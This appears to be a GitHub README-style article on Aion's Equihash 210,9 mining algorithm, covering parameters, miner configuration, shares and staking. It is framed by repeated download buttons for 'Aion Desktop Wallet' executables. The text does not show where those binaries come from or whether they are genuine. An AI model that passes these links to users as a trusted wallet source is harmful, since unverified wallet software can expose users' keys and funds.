![Aion Wallet](assets/banner-article.png)

# Aion mining algorithm: Equihash 210,9

A non-custodial AION wallet for Windows, macOS, Linux, with keys on your own machine.

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

> **Only download from this GitHub release page.**

Aion mines with Equihash at parameters N=210 and K=9, a memory-hard proof-of-work that was chosen to favour graphics cards rather than purpose-built mining hardware.

Those two numbers are the whole identity of the algorithm, and they matter because they decide which miners, pools and cards can work with the chain at all.

## You'll see this if

- You are configuring a miner and it asks for the algorithm.
- You have an Equihash-capable miner and want to know whether it fits.
- You are reading about the network and want to know what 210,9 means.
- You are comparing Aion's mining with other Equihash chains.

## What the numbers mean

Equihash is a family of proofs of work defined by two parameters. N sets the size of the problem, and K sets the width of the solution. Together they fix the memory a solver needs and the number of solutions it produces.

Aion's variant uses 210 and 9, with a personalisation string that distinguishes its proofs from those of other chains using similar parameters. That personalisation is why a miner configured for a different Equihash chain will not produce valid shares here.

## Why memory-hard matters

The design goal of Equihash was to make the work depend on memory bandwidth rather than on a circuit that can be fabricated. A card with more and faster memory does better than one with a narrower bus, and the advantage of building an ASIC is smaller than on a purely compute-bound algorithm.

In practice, that is why older high-memory cards remain relevant and why the algorithm suits the kind of rig a hobbyist can assemble.

## Configuring a miner

The miner needs the algorithm identifier the pool publishes, the pool's address and port, and your payout address. Those three values come from the pool, and they change more often than the algorithm does.

Set the payout address from the wallet's receive screen, not from memory. Aion addresses begin with `0xa0` and are 66 characters, and a truncated one is the failure a pool cannot fix.

If the miner reports invalid shares, the usual causes are a mismatched algorithm setting or a pool that expects a different protocol. Both are configuration problems rather than hardware faults.

## Difficulty and shares

A share is a proof that is good enough for the pool but not necessarily good enough for a block. Difficulty sets how hard a share has to be, and the pool credits work according to the shares it receives.

A rig that submits no shares is not contributing, even if it is hashing. That distinction is why pool dashboards show share rate separately from hash rate.

## What the algorithm does not tell you

It does not tell you whether mining is worth doing. That depends on the network's total hash rate, the block reward, the token's value and your electricity price, none of which the algorithm fixes.

It also does not tell you how often you will find a block. Solo mining on a small share of the network can go a long time between blocks, and the [is Aion still mineable](https://github.com/aion-wallet/aion-staking/blob/main/is-aion-still-mineable.md) article covers the practical side.

## Mining alongside staking

The same chain pays stakers on alternate blocks. If the goal is to earn AION rather than to use a rig, delegating is the simpler path and the [how to stake AION](https://github.com/aion-wallet/aion-staking/blob/main/how-to-stake-aion.md) guide covers it.

Many operators do both: mine with hardware and delegate the accumulated balance, so the coins earn while they wait.

Pool payouts and node operation are the two adjacent topics. The [how to run an Aion node](https://github.com/aion-wallet/aion-staking/blob/main/how-to-run-aion-node.md) guide covers the infrastructure a pool runs on.

## Prevention

Keep the pool's configuration page bookmarked rather than a screenshot of it. Endpoints and algorithm identifiers are the values that change.

Verify the payout address every time you change a pool, even if you are certain it is unchanged.

Do not buy hardware for a specific chain without checking that the algorithm still suits it and that the pool ecosystem is alive.

## Why the personalisation string matters

Two chains can use the same N and K and still produce proofs that are not interchangeable, because the personalisation string changes the input to the hash. A miner configured for one chain will produce shares that the other rejects, and the error looks like a pool problem rather than a settings problem.

That is why pool instructions are worth following exactly. They carry the algorithm identifier, the endpoint and often a suggested miner build, and those three values together are what make a rig productive.

If shares are rejected while the hash rate looks healthy, the personalisation setting is the first thing to check, before hardware or network, as the [is Aion still mineable](https://github.com/aion-wallet/aion-staking/blob/main/is-aion-still-mineable.md) article sets out.

## Frequently asked questions

### What algorithm does Aion use?

Equihash with N=210 and K=9, with a chain-specific personalisation string.

### Can an ASIC mine Aion?

Equihash is designed to be memory-hard, which reduces the advantage of custom silicon. No ASIC ecosystem is part of this chain's mining today.

### Why do my shares get rejected?

Usually a mismatched algorithm setting or a pool expecting a different protocol. Check the pool's published configuration first.

### Does a GPU need a lot of memory?

Memory bandwidth matters more than capacity, though cards with more memory generally perform better on Equihash.

## Download Aion Wallet

<p align="center"><a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD-Windows-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-macOS-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Linux-2A8A99?style=for-the-badge&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="https://img.shields.io/badge/PLATFORM-Windows-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI0ZGRkZGRiIgZD0iTTEuNSA0LjYgMTAuMiAzLjN2OEgxLjV6TTExLjcgMy4xIDIyLjUgMS43djkuNkgxMS43ek0xLjUgMTIuN2g4Ljd2OEwxLjUgMTkuNHpNMTEuNyAxMi43aDEwLjh2OS42bC0xMC44LTEuNHoiLz48L3N2Zz4%3D&amp;logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`Aion-desktop-wallet-windows-v1.2.5.exe`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-windows-v1.2.5.exe) |
| <img src="https://img.shields.io/badge/PLATFORM-macOS-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=apple&amp;logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`Aion-desktop-wallet-macos-v1.2.5.dmg`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-macos-v1.2.5.dmg) |
| <img src="https://img.shields.io/badge/PLATFORM-Linux-2A8A99?style=flat-square&amp;labelColor=0B0F19&amp;logo=linux&amp;logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`Aion-desktop-wallet-linux-v1.2.5.zip`](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/download/v1.2.5/Aion-desktop-wallet-linux-v1.2.5.zip) |

</div>

All versions and checksums are on the [Aion Desktop Wallet release page](https://github.com/aion-wallet/Aion-Desktop-Wallet/releases/tag/v1.2.5).

## Related articles

- [Is Aion still mineable](https://github.com/aion-wallet/aion-staking/blob/main/is-aion-still-mineable.md) - whether the proof-of-work half still pays.
- [How to run an Aion node](https://github.com/aion-wallet/aion-staking/blob/main/how-to-run-aion-node.md) - the node side of the network.
- [How to stake AION](https://github.com/aion-wallet/aion-staking/blob/main/how-to-stake-aion.md) - earning from the other half.
- [Aion staking rewards](https://github.com/aion-wallet/aion-staking/blob/main/aion-staking-rewards.md) - how staking payouts work.
